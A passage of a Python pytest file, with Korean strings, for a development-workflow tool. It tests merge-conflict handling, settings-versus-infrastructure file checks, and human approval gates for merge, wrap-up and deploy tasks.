    run_dir.result("T001", cells(body="동작 선택: 없음"))
    judges(run_dir, read=True)
    rc, msg = freeze(run_dir, finish=True)   # 아직 안 풀었다
    assert rc == 3 and "표시" in msg


def test_finish_refuses_edits_outside_the_conflict(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    write(integ / "src.txt", "몰래\n")
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "src.txt" in msg


def test_finish_refuses_a_decision_in_the_screen(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    run_dir.result("T001", cells(decide="- 어느 쪽?", body="동작 선택: 없음"))
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3


def code_conflict(merge_run):
    run_dir, integ = merge_run
    repo = integ.parent / "proj"
    git(repo, "checkout", "-q", FEAT)
    write(repo / "src.txt", "feat\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "feat src")
    git(repo, "checkout", "-q", "dev")
    write(integ / "src.txt", "integ\n")
    git(integ, "add", "-A")
    git(integ, "commit", "-q", "-m", "integ src")
    assert freeze(run_dir)[0] == 0
    assert run_script("exec", run_dir, "T001", "--step", "실행:1").returncode == 3
    return run_dir, integ


def test_product_conflict_is_asked(merge_run):
    run_dir, integ = code_conflict(merge_run)
    resolve(run_dir, integ, name="src.txt")
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "설정·형식" in msg
    assert close(run_dir)   # 끝내지 못한 충돌은 --verify도 알림도 통과하지 못한다


def test_infra_conflict_is_not_a_setting(run_dir):
    assert not devflow_lib.settings_only(str(run_dir), ["db/migrations/0001.sql"])
    assert not devflow_lib.settings_only(str(run_dir), [".env.local"])
    assert not devflow_lib.settings_only(str(run_dir), ["wrangler.jsonc"])
    assert not devflow_lib.settings_only(str(run_dir), ["tsconfig.json", "src/a.ts"])
    assert not devflow_lib.settings_only(str(run_dir), [])   # 재지 못하면 묻는다
    assert devflow_lib.settings_only(str(run_dir), ["tsconfig.app.json", "web/package-lock.json"])
    assert devflow_lib.settings_only(str(run_dir), ["package.json", ".gitignore", ".gitattributes", ".editorconfig", "yarn.lock", "pnpm-lock.yaml"])


@pytest.mark.parametrize("path", ["src/auth.config.ts", "next.config.js", "vite.config.ts", "build.gradle.kts", "settings.gradle", "pom.xml", "pyproject.toml",
                                  "config/security.config.yml", "Makefile", "src/a.ts"])
def test_files_with_code_or_commands_are_not_settings(run_dir, path):
    assert not devflow_lib.settings_only(str(run_dir), [path])


def test_conflict_without_record_is_asked(conflicted):   # 충돌 파일 줄을 못 읽으면 "없음"이 아니라 묻는다
    run_dir, integ = conflicted
    path = run_dir.task_dir("T001") / "exec.md"
    write(path, "".join(l + "\n" for l in path.read_text(encoding="utf-8").splitlines() if "충돌 파일" not in l))
    resolve(run_dir, integ)
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "설정·형식" in msg


def test_asked_conflict_finishes_through_the_result_point(conflicted):   # 묻는 길이 지금처럼 끝까지 간다
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    run_dir.result("T001", cells(decide="- 끝냅니다\n```cmd\ngit commit -a --no-edit\n```", body="동작 선택: 있음"))
    write(run_dir.task_dir("T001") / "task.md", (run_dir.task_dir("T001") / "task.md").read_text(encoding="utf-8").replace("status: 진행", "status: 승인대기").replace("stage: 실행", "stage: 결과승인\napproval_requested: 2026-10-15 10:00:00"))
    r = run_script("task_set", run_dir, "T001", "--status", "진행", "stage=실행", "--record", "승인|끝냄|끝내세요")
    assert r.returncode == 0, r.output
    r = run_script("exec", run_dir, "T001", "--step", "결과승인:1")
    assert r.returncode == 0, r.output
    judges(run_dir, read=True)
    ok, lines = execmod.verify(str(run_dir), run_dir.tasks()["T001"])
    assert ok, lines
    assert close(run_dir, point="승인") is None


# ---------------------------------------------------------------- 마무리 결과의 관문


def final_ci(sha):
    return "\n## 최종 배포 후보 CI\n- 범위: 전체 검증\n- 검증 commit: {}\n- 검증 artifact: ci-1\n".format(sha)


@pytest.fixture
def wrap_run(merge_run):
    """병합 방식 마무리 한 건을 `--step`까지 돌린 실행. 넣는 줄은 앞감기다."""
    run_dir, integ = merge_run
    repo = integ.parent / "proj"
    write(integ / "merged.txt", "합친 것\n")
    git(integ, "add", "-A")
    git(integ, "commit", "-q", "-m", "합친 것")
    sha = git(integ, "rev-parse", "HEAD")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    run_dir.task("T002", "마무리", kind="wrap-up", block="마무리", status="승인대기", stage="실행승인",
                 approval_requested="2026-10-15 10:00:00", **NEW)
    run_dir.result("T002", cells(decide="- 넣습니다\n```cmd\ngit merge --ff-only {}\n```".format(INTEG)))
    run_dir.judge("T002", "판정자: rjudge-T002 {}\n\n## 통과 못 한 기준\n- 없음\n".format(now))
    write(run_dir.task_dir("T002") / "judge-run.md", run_judge_text("T002", tail=final_ci(sha)))
    r = run_script("task_set", run_dir, "T002", "--status", "진행", "stage=실행", "--record", "승인|실행 승인|넣으세요")
    assert r.returncode == 0, r.output
    return run_dir, integ, repo, sha


def wrap_close(run_dir, point="알림", old="진행", old_stage="실행"):
    t = run_dir.tasks()["T002"]
    t["stage"] = "끝"
    ctx = {"record": (point, "", ""), "reason": None, "archived": False, "snapshot": False, "old_stage": old_stage}
    return task_set.check_transition(str(run_dir), t, old, kinds.DONE, ctx)


def test_wrap_up_passes_by_notice_when_the_frozen_line_ran(wrap_run):
    run_dir, integ, repo, sha = wrap_run
    r = run_script("exec", run_dir, "T002", "--step", "실행승인:1")
    assert r.returncode == 0, r.output
    assert wrap_close(run_dir) is None


def test_wrap_up_export_still_needs_the_person(wrap_run):   # 내보내기 실행 승인은 그대로 묻는다
    run_dir, *_ = wrap_run
    assert execmod.freeze_owned(str(run_dir), "T002")[0] == 3
    assert ("wrap-up", "실행승인") in kinds.STAGE_JUDGES and "실행승인" in kinds.stages_of("wrap-up")


def test_wrap_up_user_inserted_is_asked(wrap_run):
    run_dir, integ, repo, sha = wrap_run
    git(repo, "merge", "-q", "--ff-only", INTEG)
    why = wrap_close(run_dir)
    assert why and "결과승인" in why


def test_wrap_up_main_result_is_asked(wrap_run):
    run_dir, integ, repo, sha = wrap_run
    assert run_script("exec", run_dir, "T002", "--step", "실행승인:1").returncode == 0
    path = run_dir.task_dir("T002") / "exec.md"
    write(path, path.read_text(encoding="utf-8") + "- 2026-11-05 10:00:00 | git merge | 종료 코드 0 | 메인 실행: 손으로 | 지점 실행승인:1 | 폴더 x\n")
    assert "메인" in wrap_close(run_dir)


def test_wrap_up_run_in_another_folder_is_asked(wrap_run):
    run_dir, integ, repo, sha = wrap_run
    assert run_script("exec", run_dir, "T002", "--step", "실행승인:1").returncode == 0
    path = run_dir.task_dir("T002") / "exec.md"
    write(path, path.read_text(encoding="utf-8").replace(repo.as_posix(), "D:/elsewhere"))
    assert "폴더" in wrap_close(run_dir)


def test_wrap_up_mismatch_is_asked(wrap_run):
    run_dir, integ, repo, sha = wrap_run
    assert run_script("exec", run_dir, "T002", "--step", "실행승인:1").returncode == 0
    path = run_dir.task_dir("T002") / "exec.md"
    write(path, path.read_text(encoding="utf-8") + "- 2026-11-05 10:00:00 | 브랜치 판정 | 실행승인:1 | 불일치 | 앞 a 뒤 b 넣은 c@d 받은 e\n")
    assert "결과승인" in wrap_close(run_dir)


def test_wrap_up_verify_failure_is_asked(wrap_run):
    run_dir, *_ = wrap_run
    assert "결과승인" in wrap_close(run_dir)


def test_wrap_up_risk_is_asked(wrap_run):
    run_dir, integ, repo, sha = wrap_run
    run_dir.result("T002", cells(decide="- 넣습니다\n```cmd\ngit merge --ff-only {}\n```".format(INTEG), unverified="- 틀리면 터짐 [성질: 위험]"))
    assert run_script("exec", run_dir, "T002", "--step", "실행승인:1").returncode == 0
    assert "위험" in wrap_close(run_dir)


def test_wrap_up_failed_ci_with_accepted_risk_is_asked(wrap_run):
    run_dir, integ, repo, sha = wrap_run
    write(run_dir.task_dir("T002") / "judge-run.md", run_judge_text("T002", failed="- 시험 실패", tail=final_ci(sha) + "\n## 최종 CI 실패 원인\n- 원인: 코드\n"))
    r = run_script("task_set", run_dir, "T002", "--record", "승인|위험 수용|받아들입니다")
    assert r.returncode == 0, r.output
    assert run_script("exec", run_dir, "T002", "--step", "실행승인:1").returncode == 0
    assert wrap_close(run_dir)
    assert wrap_close(run_dir, point="승인", old="승인대기", old_stage="결과승인") is None


def test_old_wrap_up_still_needs_the_result_approval(run_dir):
    run_dir.task("T002", "옛", kind="wrap-up", block="마무리", status="진행", stage="끝", **OLD)
    assert "결과승인" in wrap_close(run_dir)


def test_deploy_result_is_never_a_notice(run_dir):
    run_dir.task("T001", "배포", kind="deploy-exec", block="배포", status="진행", stage="끝", **NEW)
    t = run_dir.tasks()["T001"]
    ctx = {"record": ("알림", "", ""), "reason": None, "archived": False, "snapshot": False, "old_stage": "기록"}
    assert "알림" in task_set.check_transition(str(run_dir), t, "진행", kinds.DONE, ctx)


def test_screen_gives_head_lines_on_the_asked_result_stage(merge_run):
    run_dir, _ = merge_run
    run_dir.task("T001", "합치기", kind="merge", block="구현", status="승인대기", stage="결과승인", flow="feat", **NEW)
    judges(run_dir)
    out = run_script("screen", run_dir, "T001").stdout
    assert "정하는 것: 충돌을 맞게 풀었는가" in out


# ---------------------------------------------------------------- 코드 리뷰 지적: 합치기의 경계


def flow_with_new_commit(merge_run, name="unreviewed.txt"):
    run_dir, integ = merge_run
    repo = integ.parent / "proj"
    git(repo, "checkout", "-q", FEAT)
    write(repo / name, "x\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", name)
    sha = git(repo, "rev-parse", "HEAD")
    git(repo, "checkout", "-q", "dev")
    return run_dir, integ, sha


def reviewed(run_dir, integ, tip=None):
    run_dir.task("T090", "흐름 리뷰", kind="flow-verify", block="검증", status="완료", flow="feat", approved="2026-11-01 10:00:00", reviewed_tip=tip or git(integ, "rev-parse", FEAT), **NEW)


def test_commit_after_the_flow_review_is_not_frozen_without_a_person(merge_run):
    run_dir, integ = merge_run
    reviewed(run_dir, integ)
    run_dir, integ, _ = flow_with_new_commit(merge_run)
    rc, msg = freeze(run_dir)
    assert rc == 3 and "흐름 리뷰 뒤" in msg


def test_finished_task_commit_after_the_flow_review_passes(merge_run):   # 리뷰 뒤의 수정 task
    run_dir, integ = merge_run
    reviewed(run_dir, integ)
    run_dir, integ, sha = flow_with_new_commit(merge_run)
    run_dir.task("T091", "수정", kind="fix", block="구현", status="완료", flow="feat", commit=sha[:12], **NEW)
    assert freeze(run_dir)[0] == 0


def test_open_task_commit_after_the_flow_review_is_refused(merge_run):
    run_dir, integ = merge_run
    reviewed(run_dir, integ)
    run_dir, integ, sha = flow_with_new_commit(merge_run)
    run_dir.task("T091", "수정", kind="fix", block="구현", status="승인대기", flow="feat", commit=sha[:12], **NEW)
    assert freeze(run_dir)[0] == 3


def test_received_integration_commits_do_not_count(merge_run):   # 받아온 다른 흐름의 커밋은 흐름 리뷰 뒤의 일이 아니다
    run_dir, integ = merge_run
    reviewed(run_dir, integ)
    write(integ / "other.txt", "다른 흐름\n")
    git(integ, "add", "-A")
    git(integ, "commit", "-q", "-m", "other flow")
    repo = integ.parent / "proj"
    git(repo, "checkout", "-q", FEAT)
    git(repo, "merge", "-q", "--no-edit", INTEG)
    git(repo, "checkout", "-q", "dev")
    assert freeze(run_dir)[0] == 0


def test_review_without_a_recorded_tip_is_asked(merge_run):
    run_dir, integ = merge_run
    run_dir.task("T090", "흐름 리뷰", kind="flow-verify", block="검증", status="완료", flow="feat", **NEW)
    rc, msg = freeze(run_dir)
    assert rc == 3 and "기록" in msg


def test_flow_review_records_the_tip_when_answered(merge_run):
    run_dir, integ = merge_run
    run_dir.task("T090", "흐름 리뷰", kind="flow-verify", block="검증", status="승인대기", flow="feat", approval_requested="2026-10-15 10:00:00", **NEW)
    run_dir.result("T090", cells())
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    run_dir.judge("T090", read_judge_text("T090", now))
    write(run_dir.task_dir("T090") / "judge-run.md", run_judge_text("T090", tail="\n## 흐름 리뷰 전·후\n### 장면\n- 돌리지 못함: 환경이 없음 | 서버 없음\n- 대신: 단위 시험이 확인함\n"))
    r = run_script("task_set", run_dir, "T090", "--status", "완료", "--record", "승인|승인|좋습니다")
    assert r.returncode == 0, r.output
    assert str(run_dir.tasks()["T090"]["reviewed_tip"]) and git(integ, "rev-parse", FEAT).startswith(str(run_dir.tasks()["T090"]["reviewed_tip"]))


def test_refused_merge_can_still_go_through_the_asked_result_point(merge_run):   # 멈추지 않는다
    run_dir, integ = merge_run
    reviewed(run_dir, integ)
    run_dir, integ, _ = flow_with_new_commit(merge_run)
    line = 'git merge --no-ff {} -m "사람이 봄"'.format(FEAT)
    run_dir.task("T001", "합치기", kind="merge", block="구현", status="승인대기", stage="결과승인", flow="feat", approval_requested="2026-10-15 10:00:00", **NEW)
    run_dir.result("T001", cells(decide="- 리뷰 뒤 커밋이 있습니다\n```cmd\n{}\n```".format(line)))
    judges(run_dir)
    r = run_script("task_set", run_dir, "T001", "--status", "진행", "stage=실행", "--record", "승인|합침|합치세요")
    assert r.returncode == 0, r.output
    r = run_script("exec", run_dir, "T001", "--step", "결과승인:1")
    assert r.returncode == 0, r.output
    judges(run_dir)
    assert close(run_dir, point="승인") is None


def set_run(run_dir, integ, branch, folder):
    head = (run_dir.path / "run.md").read_text(encoding="utf-8")
    write(run_dir.path / "run.md", head.replace("integration_branch: " + INTEG, "integration_branch: " + branch).replace("integration_dir: " + integ.as_posix(), "integration_dir: " + folder))


def test_merge_into_the_base_branch_needs_a_person(merge_run):
    run_dir, integ = merge_run
    repo = integ.parent / "proj"
    set_run(run_dir, integ, "dev", repo.as_posix())
    rc, msg = freeze(run_dir)
    assert rc == 3 and "개발 기준" in msg


def test_merge_in_the_original_folder_needs_a_person(merge_run):
    run_dir, integ = merge_run
    set_run(run_dir, integ, INTEG, (integ.parent / "proj").as_posix())
    assert freeze(run_dir)[0] == 3


def test_flow_that_touched_infra_is_asked_by_the_real_changed_files(merge_run):   # 실제 머리 파일 꼴: 「건드릴 파일」이 없다
    run_dir, integ, _ = flow_with_new_commit(merge_run, "db/migrations/0001.sql")
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    why = close(run_dir)
    assert why and "인프라" in why and "0001.sql" in why
    assert close(run_dir, old="승인대기", point="승인", old_stage="결과승인") is None


def test_project_infra_paths_are_used(merge_run):
    run_dir, integ, _ = flow_with_new_commit(merge_run, "deploy/prod.txt")
    assert devflow_lib.infra_paths_in(str(run_dir.path), ["deploy/prod.txt"]) == []
    assert devflow_lib.infra_paths_in(str(run_dir.path), ["db/migrations/1.sql", "a/.env.local", "src/a.ts"]) == ["db/migrations/1.sql", "a/.env.local"]


def test_unreadable_merge_diff_is_asked(merge_run, monkeypatch):
    run_dir, _ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    real = execmod.git

    def broken(cwd, *args):
        return (128, "") if "--name-only" in args else real(cwd, *args)
    monkeypatch.setattr(execmod, "git", broken)
    assert "재지 못함" in close(run_dir)


# ---------------------------------------------------------------- 넘긴 「하실 일」: 표지와 마무리 시작 조건


def handed(run_dir, tid="T090", **meta):
    run_dir.task(tid, "마무리", kind="wrap-up", block="마무리", status="대기", **dict(NEW, **meta))
    return run_dir


def start_reasons(run_dir, tid="T090"):
    import board
    tasks = run_dir.tasks()
    return board.start_blocks(tasks, board.load_flows(str(run_dir.path)), 2, tasks[tid])


def test_handed_todo_without_a_probe_blocks_the_wrap_up(run_dir):
    handed(run_dir)
    write(run_dir.path / "decisions.md", '- 2026-11-01 10:00 | [하실 일 넘김 T012] 예시 자원 세팅 | 원문: "넘깁니다" | T012\n')
    assert any("T012" in r for r in start_reasons(run_dir))
    run_dir.task("T013", "넘긴 일", {"범위": "세팅\n남는 것: 자원"}, kind="probe", block="설계", status="완료", origin="하실 일 넘김 T012", **NEW)
    assert not any("T012" in r for r in start_reasons(run_dir))


def test_handed_mark_in_the_approval_record_counts(run_dir):
    handed(run_dir)
    run_dir.task("T012", "인프라", {"승인 기록": '- 2026-11-01 10:00:00 | 하실 일 넘김 | [하실 일 넘김 T012] 세팅 | 원문: "넘깁니다"\n'}, kind="infra-design", block="설계", status="완료", **NEW)
    assert any("T012" in r for r in start_reasons(run_dir))


def test_replaced_handed_mark_and_a_quoted_mark_do_not_count(run_dir):
    handed(run_dir)
    write(run_dir.path / "decisions.md", '- 2026-11-01 10:00 | [하실 일 넘김 T012] 세팅 → 대체: 2026-11-01 11:00 | 원문: "넘깁니다" | T012\n'
          '- 2026-11-01 10:00 | 답 | 원문: "[하실 일 넘김 T014] 라고 적지 마" | T014\n')
    assert devflow_lib.handed_without_probe(str(run_dir.path), run_dir.tasks()) == []


def test_other_origin_number_does_not_satisfy_the_mark(run_dir):
    handed(run_dir)
    write(run_dir.path / "decisions.md", '- 2026-11-01 10:00 | [하실 일 넘김 T01] 세팅 | 원문: "해" | T01\n')
    run_dir.task("T013", "넘긴 일", kind="probe", block="설계", status="완료", origin="하실 일 넘김 T012", **NEW)
    assert devflow_lib.handed_without_probe(str(run_dir.path), run_dir.tasks()) == ["T01"]


def test_old_wrap_up_ignores_the_mark(run_dir):
    handed(run_dir, **OLD)
    write(run_dir.path / "decisions.md", '- 2026-11-01 10:00 | [하실 일 넘김 T012] 세팅 | 원문: "넘깁니다" | T012\n')
    assert not any("T012" in r for r in start_reasons(run_dir))


def test_unreadable_decisions_do_not_stop_the_wrap_up_start(run_dir):   # 리뷰가 재지 못함으로 말한다
    handed(run_dir)
    with open(run_dir.path / "decisions.md", "wb") as f:
        f.write(b"\xff\xfe bad")
    assert devflow_lib.handed_without_probe(str(run_dir.path), run_dir.tasks()) == []
